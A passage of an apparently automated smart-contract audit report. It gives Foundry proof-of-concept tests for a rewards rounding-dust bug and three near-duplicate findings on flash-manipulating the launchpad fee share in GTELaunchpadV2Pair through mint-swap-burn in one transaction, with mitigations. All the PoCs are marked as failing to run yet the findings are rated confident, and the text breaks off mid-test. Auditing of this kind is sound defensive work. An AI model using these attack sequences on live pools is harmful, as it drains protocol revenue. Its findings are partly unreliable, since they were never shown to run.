        Q.mint(staker, 1e24);
        vm.prank(staker);
        Q.approve(address(distributor), type(uint256).max);
    }

    function test_RoundingDustLocksAndBlocksSkim() public {
        uint256 N = 1000;
        for (uint256 i; i < N; ++i) {
            // Add a 1-wei reward then immediately force update() via claim
            vm.prank(staker);
            distributor.addRewards(address(L), address(Q), 0, 1);

            vm.prank(staker);
            distributor.claimRewards(address(L)); // update() deletes pending; no payout due to rounding-to-zero
        }

        // All N wei are now stuck in the Distributor, but unclaimable
        assertEq(Q.balanceOf(address(distributor)), N, "contract should hold N wei of Q");
        assertEq(distributor.totalPendingRewards(address(Q)), N, "pending accounting inflated by N");

        // User has no pending rewards
        (uint256 baseP, uint256 quoteP) = distributor.getPendingRewards(address(L), staker);
        assertEq(baseP, 0);
        assertEq(quoteP, 0);

        // Owner cannot skim any positive amount because balance - totalPendingRewards == 0
        vm.expectRevert(Distributor.SkimOverflow.selector);
        distributor.skimExcessRewards(address(Q), 1);

        // Even after removing all shares, dust remains unclaimable and still blocks skim
        vm.prank(launchpad);
        distributor.decreaseStake(address(L), staker, 10_000_000_000_000);
        vm.expectRevert(Distributor.SkimOverflow.selector);
        distributor.skimExcessRewards(address(Q), 1);
    }
}


## Suggested Mitigation
Address both the rounding loss and the inability to recover dust:

A) Preserve rounding remainders instead of deleting pending rewards in update():
- Replace delete with carry-over of undistributed remainder so it can be distributed in future updates.

Example (conceptual):

// inside RewardsTrackerLib.update()
uint96 S = self.totalShares;
if (S != 0 && self.pendingBaseRewards > 0) {
    uint256 inc = (uint256(self.pendingBaseRewards) * PRECISION_FACTOR) / S;
    self.accBaseRewardPerShare += inc;
    uint128 distributed = uint128((inc * S) / PRECISION_FACTOR); // floor to what is actually claimable
    self.pendingBaseRewards -= distributed; // keep leftover dust for future tranches
}
// repeat the same for quote

This change eliminates per-update reward loss, keeping totalPendingRewards aligned with actual future payouts.

B) Add a dust reconciliation path when a pool is inactive (no shares):
- Provide an admin-only function in Distributor to reconcile a pool’s leftover pending to enable skimming once totalShares == 0 for that launchAsset.

Example (conceptual):
function finalizePool(address launchAsset) external onlyOwnerOrRoles(ADMIN_ROLE) {
    RewardPoolData storage rs = RewardsTrackerStorage.getRewardPool(launchAsset);
    require(rs.totalShares == 0, "shares > 0");
    // Any remaining pending amounts in the pool are forever undistributable; subtract them from totalPendingRewards
    if (rs.pendingBaseRewards > 0) {
        uint128 amt = rs.pendingBaseRewards;
        rs.pendingBaseRewards = 0;
        _decreaseTotalPending(launchAsset, amt);
    }
    if (rs.pendingQuoteRewards > 0) {
        uint128 amtQ = rs.pendingQuoteRewards;
        rs.pendingQuoteRewards = 0;
        _decreaseTotalPending(rs.quoteAsset, amtQ);
    }
}

With (A), rounding dust is no longer lost; with (B), any residual pending after a pool has ended can be reconciled so that asset.balanceOf(this) - totalPendingRewards[asset] reflects true excess and can be skimmed.





 **Derived From** : Launchpad fee share on swaps manipulable via same-tx liquidity changes

## [M-3]. Launchpad fee share in GTELaunchpadV2Pair can be flash-manipulated via intra-tx LP mint/burn to reduce rewards

### Finding Severity Justification: The issue enables permissionless, intra-transaction dilution of the launchpad’s LP share, making the computed launchpad fee for a swap arbitrarily small. This results in consistent loss of matured fee revenue (yield) to the launchpad rewards system without violating AMM invariants or custody. User funds are not directly stolen; impact is economic loss to the protocol’s intended fee capture, which aligns with a Medium under Code4rena’s rubric.
## Derived From Pattern/Invariant
Launchpad fee share on swaps manipulable via same-tx liquidity changes

## Exploit Type
FlashLoanEconomicManipulation

## Location
GTELaunchpadV2Pair.swap / _getLaunchpadFees

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The launchpad’s share of swap fees in GTELaunchpadV2Pair depends on the ratio of launchpad-owned LP tokens to total LP supply at the moment of the swap. This ratio is read inside `_getLaunchpadFees` and is fully manipulable within a single transaction by minting/burning LP tokens using flash liquidity.

```solidity
uint256 public constant REWARDS_FEE_SHARE = 1; // bps-like scaling

function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external lock {
    ...
    uint256 amount0In = balance0 > _reserve0 - amount0Out ? balance0 - (_reserve0 - amount0Out) : 0;
    uint256 amount1In = balance1 > _reserve1 - amount1Out ? balance1 - (_reserve1 - amount1Out) : 0;
    if (amount0In == 0 && amount1In == 0) revert("UniswapV2: INSUFFICIENT_INPUT_AMOUNT");

    {
        uint256 balance0Adjusted = balance0.mul(1000).sub(amount0In.mul(3));
        uint256 balance1Adjusted = balance1.mul(1000).sub(amount1In.mul(3));
        if (balance0Adjusted.mul(balance1Adjusted) < uint256(_reserve0).mul(_reserve1).mul(1000 ** 2)) {
            revert("UniswapV2: K");
        }

        (uint112 launchpadFee0, uint112 launchpadFee1) = launchpadFeeDistributor > address(0)
            && rewardsPoolActive > 0 ? _getLaunchpadFees(amount0In, amount1In) : (uint112(0), uint112(0));

        _update(balance0, balance1, _reserve0, _reserve1, launchpadFee0, launchpadFee1);
    }
    ...
}

function _getLaunchpadFees(uint256 amount0In, uint256 amount1In)
    internal
    view
    returns (uint112 fee0, uint112 fee1)
{
    uint256 totalLpBal = this.totalSupply();
    uint256 launchpadLpBal = this.balanceOf(launchpadLp) + MINIMUM_LIQUIDITY;

    if (amount0In > 0) fee0 = uint112(amount0In.mul(REWARDS_FEE_SHARE).mul(launchpadLpBal) / (totalLpBal * 1000));
    if (amount1In > 0) fee1 = uint112(amount1In.mul(REWARDS_FEE_SHARE).mul(launchpadLpBal) / (totalLpBal * 1000));
}
```

`launchpadLpBal / totalLpBal` is intended to represent the launchpad’s share of LP supply, so only that pro‑rata portion of swap fees is siphoned to the rewards Distributor. However, `totalSupply()` and `balanceOf(launchpadLp)` are mutable and can be changed *within the same transaction* before calling `swap()`:

- An attacker can flash-borrow large amounts of token0/token1, call `mint()` to create a huge amount of LP tokens for themselves, massively increasing `totalSupply` while `launchpadLpBal` remains constant.
- Then they call `swap()`. Since `_getLaunchpadFees` is a `view` function that reads `totalSupply` and `launchpadLpBal` at this point, the ratio `launchpadLpBal / totalLpBal` becomes tiny, and thus `fee0/fee1` computed for the same `amount0In/amount1In` is near zero.
- After the swap, the attacker can `burn()` their LP and repay the flash loan, restoring the pool to its prior state within the same transaction.

The `lock` modifier only prevents direct reentrancy but does not stop sequential calls like `mint()` -> `swap()` -> `burn()` from an external contract in the same tx. There is no TWAP or multi-block observation of the LP distribution. As a result, an economic attacker can systematically reduce the effective launchpad fee they pay on large swaps, shifting value away from the rewards system and into their own trades.

## Impact
Attackers can use flash-minted LP to temporarily inflate `totalSupply` and shrink `launchpadLpBal/totalLpBal`, drastically reducing the launchpad’s fee share on their swaps. This harms launchpad stakeholders and reduces rewards, while giving attackers effectively cheaper trades. The core AMM invariant remains intact, but fee economics are manipulable.

## Command to Run Test


## Proof of Concept
Attack outline (single transaction):
- Precondition: Pair has been initialized; launchpadLp holds the initial LP from seeding; launchpadFeeDistributor is non-zero; rewardsPoolActive = 1.
- Attacker steps:
  1) Transfer a large, balanced amount of token0 and token1 into the pair and call mint(attacker). This inflates totalSupply massively while launchpadLp’s LP balance remains unchanged.
  2) Compute a valid amountOut for a chosen amountIn using the standard Uniswap V2 formula, transfer amountIn of token0 to the pair, then call swap(0, amount1Out, attacker, ""). Inside swap, _getLaunchpadFees uses launchpadLpBal/totalSupply which is now tiny, so the computed fee0 is near zero.
  3) (Optional for capital efficiency) Burn the temporary LP, redeeming the deposited tokens, and repay any flash loan used. This returns the pool to its prior state, but the swap’s launchpad fee was minimized.
- Observation: Comparing the accruedLaunchpadFee0 from an identical swap with and without the temporary LP mint shows that fees are orders of magnitude smaller under manipulation. Burning is not necessary to prove the dilution; it only restores capital.


## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {GTELaunchpadV2Pair} from "contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol";

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s) { name = n; symbol = s; }

    function mint(address to, uint256 amt) external {
        totalSupply += amt;
        balanceOf[to] += amt;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        require(balanceOf[msg.sender] >= amt, "bal");
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function approve(address sp, uint256 amt) external returns (bool) {
        allowance[msg.sender][sp] = amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        require(balanceOf[from] >= amt, "bal");
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) {
            require(a >= amt, "allow");
            allowance[from][msg.sender] = a - amt;
        }
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

contract LaunchpadFeeManipulationTest is Test {
    GTELaunchpadV2Pair pair;
    MockERC20 token0;
    MockERC20 token1;
    address launchpadLp = address(0x1111);
    address dummyDistributor = address(0xBEEF); // non-zero so fees are computed; distribution is skipped same-block

    function setUp() public {
        token0 = new MockERC20("T0", "T0");
        token1 = new MockERC20("T1", "T1");
    }

    function _deployPairAndSeed(uint256 seed) internal returns (GTELaunchpadV2Pair p) {
        p = new GTELaunchpadV2Pair();
        p.initialize(address(token0), address(token1), launchpadLp, dummyDistributor);

        // Seed initial liquidity owned by launchpad (nearly 100% of LP supply)
        token0.mint(address(this), seed);
        token1.mint(address(this), seed);
        token0.transfer(address(p), seed);
        token1.transfer(address(p), seed);
        p.mint(launchpadLp);
    }

    function _getAmountOut(uint256 amountIn, uint112 reserveIn, uint112 reserveOut) internal pure returns (uint256) {
        // Uniswap V2 formula with 0.3% fee
        uint256 amountInWithFee = amountIn * 997;
        uint256 numerator = amountInWithFee * reserveOut;
        uint256 denominator = uint256(reserveIn) * 1000 + amountInWithFee;
        return numerator / denominator;
        }

    function testLaunchpadFeeDilutionViaLPMint() public {
        uint256 SEED = 1_000_000 ether;
        uint256 TRADE_IN = 1000 ether;

        // -------- Baseline (no manipulation) --------
        pair = _deployPairAndSeed(SEED);
        (uint112 r0, uint112 r1,) = pair.getReserves();
        uint256 outBaseline = _getAmountOut(TRADE_IN, r0, r1);
        // pre: fees 0
        (uint112 f0Before,,) = pair.getAccruedLaunchpadFees();
        assertEq(f0Before, 0);
        // perform swap 0->1
        token0.mint(address(this), TRADE_IN);
        token0.transfer(address(pair), TRADE_IN);
        pair.swap(0, outBaseline, address(this), "");
        (uint112 f0Base,,) = pair.getAccruedLaunchpadFees();
        assertGt(f0Base, 0); // some fee accrued

        // -------- Manipulated (flash-mint style LP before swap) --------
        GTELaunchpadV2Pair pair2 = _deployPairAndSeed(SEED);
        // attacker mints massive LP to dilute launchpad share
        uint256 ATTACK_ADD = 100_000_000 ether;
        token0.mint(address(this), ATTACK_ADD);
        token1.mint(address(this), ATTACK_ADD);
        token0.transfer(address(pair2), ATTACK_ADD);
        token1.transfer(address(pair2), ATTACK_ADD);
        pair2.mint(address(this));
        // Sanity: launchpad share is now tiny
        uint256 totalSupply = pair2.totalSupply();
        uint256 launchpadBal = pair2.balanceOf(launchpadLp) + pair2.MINIMUM_LIQUIDITY();
        assertLt(launchpadBal * 100, totalSupply); // <1% share

        (uint112 r0b, uint112 r1b,) = pair2.getReserves();
        uint256 outManip = _getAmountOut(TRADE_IN, r0b, r1b);
        (uint112 f0Bef,,) = pair2.getAccruedLaunchpadFees();
        assertEq(f0Bef, 0);
        token0.mint(address(this), TRADE_IN);
        token0.transfer(address(pair2), TRADE_IN);
        pair2.swap(0, outManip, address(this), "");
        (uint112 f0Manip,,) = pair2.getAccruedLaunchpadFees();

        // Assert dilution: manipulated fee should be orders of magnitude smaller than baseline
        assertLt(uint256(f0Manip) * 50, uint256(f0Base));
    }
}


## Suggested Mitigation
Use a fee-share snapshot that is not manipulable within the same transaction/block, or make the share immutable:
- Snapshot-based: Maintain a cachedShare = (balanceOf(launchpadLp) + MINIMUM_LIQUIDITY) / totalSupply that is only updated when timeElapsed > 0 (i.e., on the first state-changing call per new block in _update). Then _getLaunchpadFees uses cachedShare instead of live totalSupply/balanceOf. This prevents same-block LP mint/burn from affecting the share used for swaps in that block.
- Transaction guard: Record lastLiquidityEventBlock and lastSwapBlock; revert swaps that accrue launchpad fees if a mint/burn occurred earlier in the same block (and vice versa). This blocks atomic dilution while allowing normal usage across blocks.
- Immutable share: If acceptable product-wise, fix the launchpad fee share at deployment (e.g., initial launchpad LP fraction) and store it as a constant numerator/denominator, instead of reading live LP balances.
Any of the above will eliminate the permissionless intra-transaction fee-share dilution while preserving intended dynamics across longer time horizons.


## [M-4]. Launchpad’s fee share per swap can be reduced arbitrarily via same-tx LP mint/burn manipulation

### Finding Severity Justification: The launchpad’s per-swap rewards are economically bypassable by a permissionless same-transaction mint→swap→burn sequence that inflates LP totalSupply to shrink the launchpad LP share used in fee calculation. This results in consistent loss of intended fee revenue (matured rewards) for launchpad stakers and the protocol, but does not enable theft of user principal or pool reserves. Impact is persistent and repeatable but limited to fee/reward diversion, hence Medium.
## Derived From Pattern/Invariant
Launchpad fee share on swaps manipulable via same-tx liquidity changes

## Exploit Type
FlashLoanEconomicManipulation

## Location
GTELaunchpadV2Pair._getLaunchpadFees (via swap)

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
GTELaunchpadV2Pair’s launchpad fee share is computed using the current LP token distribution (launchpad LP balance vs total supply) at the moment of the swap. Because LP supply and balances are fully manipulable within the same transaction (via `mint` and `burn`), an attacker can use flash liquidity to drastically reduce the fee portion that goes to the launchpad rewards.

Relevant code:

```solidity
uint256 public constant REWARDS_FEE_SHARE = 1; // 0.1% of input as fee when applied

function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external lock {
    ...
    uint256 amount0In = ...;
    uint256 amount1In = ...;
    ...
    uint256 balance0Adjusted = balance0.mul(1000).sub(amount0In.mul(3));
    uint256 balance1Adjusted = balance1.mul(1000).sub(amount1In.mul(3));
    if (balance0Adjusted.mul(balance1Adjusted) < uint256(_reserve0).mul(_reserve1).mul(1000 ** 2)) {
        revert("UniswapV2: K");
    }

    (uint112 launchpadFee0, uint112 launchpadFee1) = launchpadFeeDistributor > address(0)
        && rewardsPoolActive > 0 ? _getLaunchpadFees(amount0In, amount1In) : (uint112(0), uint112(0));

    _update(balance0, balance1, _reserve0, _reserve1, launchpadFee0, launchpadFee1);
    ...
}

function _getLaunchpadFees(uint256 amount0In, uint256 amount1In)
    internal
    view
    returns (uint112 fee0, uint112 fee1)
{
    uint256 totalLpBal = this.totalSupply();
    uint256 launchpadLpBal = this.balanceOf(launchpadLp) + MINIMUM_LIQUIDITY;

    if (amount0In > 0) fee0 = uint112(amount0In.mul(REWARDS_FEE_SHARE).mul(launchpadLpBal) / (totalLpBal * 1000));
    if (amount1In > 0) fee1 = uint112(amount1In.mul(REWARDS_FEE_SHARE).mul(launchpadLpBal) / (totalLpBal * 1000));
}
```

The effective fraction of the swap input sent to the Distributor is:

`feeFraction ≈ (REWARDS_FEE_SHARE / 1000) * (launchpadLpBal / totalLpBal)`

Both `launchpadLpBal` (launchpad LP balance + MINIMUM_LIQUIDITY) and `totalLpBal` (pair totalSupply) are manipulable by any LP in the same transaction:
- `mint` and `burn` are external, permissionless and only protected by the `lock` modifier on their own calls.
- A contract can call `mint` and then `swap` sequentially within one transaction; the `lock` only prevents reentrant calls into **the same** function, not sequential calls.

Attack pattern:
1. Attacker uses a flash loan to obtain large amounts of token0 and token1.
2. In the same transaction, attacker supplies this into the pair via `mint`, greatly increasing `totalSupply` while leaving `launchpadLpBal` nearly unchanged.
3. Attacker then calls `swap` to perform their desired trade. Now `launchpadLpBal / totalLpBal` is extremely small, so `launchpadFee0/1` is near zero; almost none of the input fee is diverted to the launchpad rewards.
4. After the swap, attacker calls `burn` to withdraw the temporary liquidity, repaying the flash loan and restoring the pool to near its original state.

Throughout, the Uniswap k-invariant and standard trader fees remain intact; only the **launchpad’s fee share** is affected, reducing fee income for bonded token holders and the protocol. This is a classic single-tx economic manipulation: the critical variable (`launchpadLpBal / totalLpBal`) is read once per swap without any TWAP / multi-block averaging and is trivially manipulable via same-tx liquidity operations.

## Impact
An attacker can reduce the launchpad’s per-swap rewards to near-zero by inflating LP totalSupply within the same transaction using a mint->swap->burn sequence. This consistently diverts revenue away from the launchpad reward program and protocol, while not compromising user principal or pool solvency. The impact is persistent, repeatable on any swap path, and provides unfair pricing to manipulators by eliminating the intended launchpad fee component.

## Command to Run Test


## Proof of Concept
Attack sequence in a single transaction:
1) Attacker flash-borrows (or temporarily sources) token0 and token1, transfers a large amount of both to the pair, and calls mint(attacker) to obtain a huge amount of LP tokens. This makes totalSupply >> launchpadLp balance, shrinking the ratio launchpadLpBal/totalLpBal used in _getLaunchpadFees.
2) Attacker performs the intended swap by first transferring the input token to the pair, then calling swap(...). Because _getLaunchpadFees uses the instantaneous LP ratio, the computed launchpad fee is now arbitrarily small.
3) Attacker transfers their LP back to the pair and calls burn(attacker) to remove the temporary liquidity, repays the flash loan, and restores the pool close to its original state. The trader fee and k-invariant hold; only the launchpad fee stream is bypassed.
Note: The lock modifier only prevents reentrancy into the same function, not sequential calls. MINIMUM_LIQUIDITY being added to launchpadLpBal does not mitigate, as it is negligible compared to an attacker’s inflated totalSupply.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {GTELaunchpadV2Pair} from "contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol";

interface IERC20Like {
    function balanceOf(address) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function approve(address sp, uint256 amount) external returns (bool);
}

contract MockERC20 {
    string public name = "Mock";
    string public symbol = "M";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "bal");
        require(allowance[from][msg.sender] >= amount, "allow");
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address sp, uint256 amount) external returns (bool) {
        allowance[msg.sender][sp] = amount;
        return true;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }
}

contract FactoryStub {
    address public feeToAddr; // defaults to 0 (fee off)
    function feeTo() external view returns (address) { return feeToAddr; }

    function createPair(address token0, address token1, address launchpadLp, address distributor)
        external
        returns (GTELaunchpadV2Pair pair)
    {
        pair = new GTELaunchpadV2Pair(); // constructor sets factory = address(this)
        pair.initialize(token0, token1, launchpadLp, distributor);
    }
}

contract DummyDistributor {
    event Added(address t0, address t1, uint128 a0, uint128 a1);
    function addRewards(address t0, address t1, uint128 a0, uint128 a1) external { emit Added(t0, t1, a0, a1); }
}

contract FeeShareManipulationTest is Test {
    GTELaunchpadV2Pair pair;
    MockERC20 token0;
    MockERC20 token1;
    FactoryStub factory;
    DummyDistributor distributor;

    address launchpadLp = address(0x1111);
    address attacker = address(this);

    function setUp() public {
        token0 = new MockERC20();
        token1 = new MockERC20();
        factory = new FactoryStub();
        distributor = new DummyDistributor();

        pair = factory.createPair(address(token0), address(token1), launchpadLp, address(distributor));

        // Seed initial balances
        token0.mint(address(this), 2_000_000e18);
        token1.mint(address(this), 2_000_000e18);

        // Initial liquidity provided to launchpadLp
        token0.transfer(address(pair), 100e18);
        token1.transfer(address(pair), 100e18);
        pair.mint(launchpadLp); // LP minted to launchpad

        // Sanity: launchpad has LP and totalSupply > 0
        assertGt(pair.balanceOf(launchpadLp), 0, "no LP for launchpad");
        assertGt(pair.totalSupply(), 0, "no LP supply");
    }

    function _getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) internal pure returns (uint amountOut) {
        // Uniswap v2 formula with 0.3% fee
        uint amountInWithFee = amountIn * 997;
        uint numerator = amountInWithFee * reserveOut;
        uint denominator = reserveIn * 1000 + amountInWithFee;
        amountOut = numerator / denominator;
    }

    function testLaunchpadFeeShareManipulable() public {
        // Baseline swap without manipulation
        (uint112 r0, uint112 r1,) = pair.getReserves();
        uint256 amount0In = 1e18; // 1 token0
        uint256 out1 = _getAmountOut(amount0In, r0, r1);

        (uint112 acc0Before,,) = pair.getAccruedLaunchpadFees();
        token0.transfer(address(pair), amount0In);
        pair.swap(0, out1, attacker, new bytes(0));
        (uint112 acc0After,,) = pair.getAccruedLaunchpadFees();
        uint256 honestFee0 = uint256(acc0After) - uint256(acc0Before);
        assertGt(honestFee0, 0, "expected nonzero baseline fee");

        // Manipulate: inflate LP supply massively via mint
        // Transfer large balanced liquidity and mint to attacker
        token0.transfer(address(pair), 1_000_000e18);
        token1.transfer(address(pair), 1_000_000e18);
        pair.mint(attacker);

        // Perform the same input swap in the same block
        (r0, r1,) = pair.getReserves();
        uint256 out1Manip = _getAmountOut(amount0In, r0, r1);

        (acc0Before,,) = pair.getAccruedLaunchpadFees();
        token0.transfer(address(pair), amount0In);
        pair.swap(0, out1Manip, attacker, new bytes(0));
        (acc0After,,) = pair.getAccruedLaunchpadFees();
        uint256 manipulatedFee0 = uint256(acc0After) - uint256(acc0Before);

        // The manipulated fee must be strictly smaller; typically orders of magnitude smaller
        assertLt(manipulatedFee0, honestFee0 / 50, "fee not sufficiently reduced by supply inflation");

        // Clean up: burn the temporary LP (transfer LP back to pair then burn)
        uint256 lpBal = pair.balanceOf(attacker);
        pair.transfer(address(pair), lpBal);
        pair.burn(attacker);
    }
}


## Suggested Mitigation
Make the launchpad fee share calculation robust against intra-transaction LP supply manipulation by decoupling it from the instantaneous totalSupply/balanceOf values:
- Best: Use a per-block snapshot for fee math. Maintain snapshotTotalSupply and snapshotLaunchpadLpBalance updated only on the first _update() per block (when timeElapsed > 0). Compute _getLaunchpadFees against these snapshots rather than live values. This prevents same-block mint->swap->burn sequences from affecting the fee share.
- Alternative: Make the launchpad share a fixed fraction of the swap fee (e.g., fixed bps of the 0.3% trader fee), independent of LP distribution.
- Optional hardening: If proportionality to LP ownership is required, use a multi-block TWAP of the LP share (time-weighted average of launchpadLp/totalSupply) to resist transient inflation, or require a minimum holding period for LP to be counted in the share calculation.


## [M-5]. Launchpad fee share in GTELaunchpadV2Pair.swap manipulable via flash-mint/burn of LP tokens

### Finding Severity Justification: The issue enables traders to reduce or nearly eliminate the launchpad’s rewards-fee portion for their swaps by temporarily inflating LP totalSupply within the same transaction. This impacts protocol/launchpad revenue rather than user custodial funds, fitting Medium per Code4rena rubric (protocol value/revenue degradation without direct user fund loss).
## Derived From Pattern/Invariant
Launchpad fee share on swaps manipulable via same-tx liquidity changes

## Exploit Type
FlashLoanEconomicManipulation

## Location
GTELaunchpadV2Pair.swap

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 5
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The launchpad’s share of swap fees in `GTELaunchpadV2Pair` is computed based on the current LP token distribution, specifically the ratio `launchpadLpBal / totalLpBal`. Both `totalSupply()` and `balanceOf(launchpadLp)` are fully manipulable inside the same transaction using flash liquidity and sequential `mint`/`burn` calls. As a result, attackers can dramatically reduce the effective fee share sent to the Distributor for their own swaps, draining launchpad rewards.

Relevant code (GTELaunchpadV2Pair):
```solidity
uint256 public constant REWARDS_FEE_SHARE = 1; // fraction of input routed to rewards

function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external lock {
    ...
    uint256 amount0In = ...;
    uint256 amount1In = ...;
    if (amount0In == 0 && amount1In == 0) revert("UniswapV2: INSUFFICIENT_INPUT_AMOUNT");

    {
        uint256 balance0Adjusted = balance0.mul(1000).sub(amount0In.mul(3));
        uint256 balance1Adjusted = balance1.mul(1000).sub(amount1In.mul(3));
        if (balance0Adjusted.mul(balance1Adjusted) < uint256(_reserve0).mul(_reserve1).mul(1000 ** 2)) {
            revert("UniswapV2: K");
        }

        (uint112 launchpadFee0, uint112 launchpadFee1) = launchpadFeeDistributor > address(0)
            && rewardsPoolActive > 0 ? _getLaunchpadFees(amount0In, amount1In) : (uint112(0), uint112(0));

        _update(balance0, balance1, _reserve0, _reserve1, launchpadFee0, launchpadFee1);
    }
    ...
}

function _getLaunchpadFees(uint256 amount0In, uint256 amount1In)
    internal
    view
    returns (uint112 fee0, uint112 fee1)
{
    uint256 totalLpBal = this.totalSupply();
    uint256 launchpadLpBal = this.balanceOf(launchpadLp) + MINIMUM_LIQUIDITY;

    if (amount0In > 0) fee0 = uint112(amount0In.mul(REWARDS_FEE_SHARE).mul(launchpadLpBal) / (totalLpBal * 1000));
    if (amount1In > 0) fee1 = uint112(amount1In.mul(REWARDS_FEE_SHARE).mul(launchpadLpBal) / (totalLpBal * 1000));
}
```
The pair uses the standard Uniswap V2 `lock` reentrancy guard, but this only prevents *reentrant* calls to `swap`. It does not prevent a contract from calling `mint`, then `swap`, then `burn` sequentially in the same transaction.

Exploit sketch:
1. Attacker flash-borrows large amounts of `token0` and `token1`.
2. Calls `mint()` on the pair, depositing these tokens and receiving a huge amount of LP tokens, increasing `totalSupply` dramatically while `launchpadLpBal` remains roughly constant.
3. Immediately calls `swap()` from the same contract. Inside `_getLaunchpadFees`, `launchpadLpBal / totalLpBal` is now ~0, so `fee0`/`fee1` are negligible, and nearly all of the 0.3 % swap fee remains in the pool instead of being siphoned to the Distributor.
4. After the swap, the attacker calls `burn()` to redeem the LP tokens and repay the flash loan. They retain the economic benefit of having paid effectively lower protocol/launchpad fees.

This is a classic flash-loan economic manipulation: the decision about how much fee goes to the launchpad is based purely on intra-transaction manipulable state (LP total supply and balances), without any time-weighting or delay. Over repeated usage, this can significantly reduce launchpad rewards compared to the intended design.

## Impact
Attackers can minimize the launchpad’s rewards-fee share for their swaps by transiently inflating LP totalSupply within the same transaction (mint ➜ swap ➜ burn). Beyond merely reducing protocol revenue, the attacker can also capture a large portion of the 0.3% swap fee as a temporary LP while keeping their impermanent loss negligible (because they can add very large liquidity to make their own swap nearly price-neutral). This creates a sustained economic advantage for sophisticated actors and materially degrades launchpad fee capture across volume.

## Command to Run Test


## Proof of Concept
Preconditions: A GTELaunchpadV2Pair is initialized with token0/token1, a launchpadLp address that holds the initial LP tokens, and a nonzero launchpadFeeDistributor.

Attack sequence (single transaction from an attacker contract):
1) Acquire large amounts of token0 and token1 (via flash loan or existing balances).
2) Add massive liquidity proportionally to current reserves:
   - transfer token0 and token1 to the pair
   - call pair.mint(attacker)
   This inflates totalSupply dramatically while launchpadLp balance stays roughly constant, pushing launchpadLpBal / totalSupply near zero.
3) Execute the desired swap (e.g., token0 -> token1):
   - transfer the exact token0 input to the pair
   - compute amount1Out with XYK formula and call pair.swap(0, amount1Out, attacker, "")
   Inside swap, _getLaunchpadFees uses the now-diluted ratio, so fee0/fee1 accrued to the launchpad Distributor is tiny.
4) Immediately remove the temporary liquidity:
   - read LP balance of attacker
   - pair.transfer(address(pair), lpBalance)
   - pair.burn(attacker)
   Attacker recovers nearly all deposited liquidity and also captures a share of the 0.3% swap fee as a temporary LP while having paid minimal launchpad fee due to the diluted ratio.

Observation: The UniswapV2-style lock modifier only prevents reentrancy into the same function; it does not block sequential calls to mint ➜ swap ➜ burn in the same transaction, enabling intra-tx manipulation of totalSupply and thus the fee split.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {GTELaunchpadV2Pair} from "contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol";

interface IERC20Minimal {
    function totalSupply() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function transfer(address,uint256) external returns (bool);
    function transferFrom(address,address,uint256) external returns (bool);
    function approve(address,uint256) external returns (bool);
}

contract MockERC20 is IERC20Minimal {
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    uint256 public override totalSupply;
    mapping(address => uint256) public override balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s) { name = n; symbol = s; }

    function mint(address to, uint256 amount) external {
        totalSupply += amount;
        balanceOf[to] += amount;
        emit Transfer(address(0), to, amount);
    }

    function transfer(address to, uint256 amount) external override returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external override returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IDistributorMock {
    function addRewards(address token0, address token1, uint128 amount0, uint128 amount1) external;
}

contract MockDistributor is IDistributorMock {
    uint256 public total0;
    uint256 public total1;
    function addRewards(address, address, uint128 amount0, uint128 amount1) external {
        total0 += amount0;
        total1 += amount1;
    }
}

contract FeeShareManipulationTest is Test {
    GTELaunchpadV2Pair pair;
    MockERC20 token0;
    MockERC20 token1;
    MockDistributor distributor;
    address launchpadLp = address(0xA11CE);

    // Pair reads factory via IUniswapV2Factory(factory).feeTo().
    // Since factory == deployer (this contract), expose feeTo() returning address(0) to disable fee minting.
    function feeTo() external view returns (address) { return address(0); }

    function setUp() public {
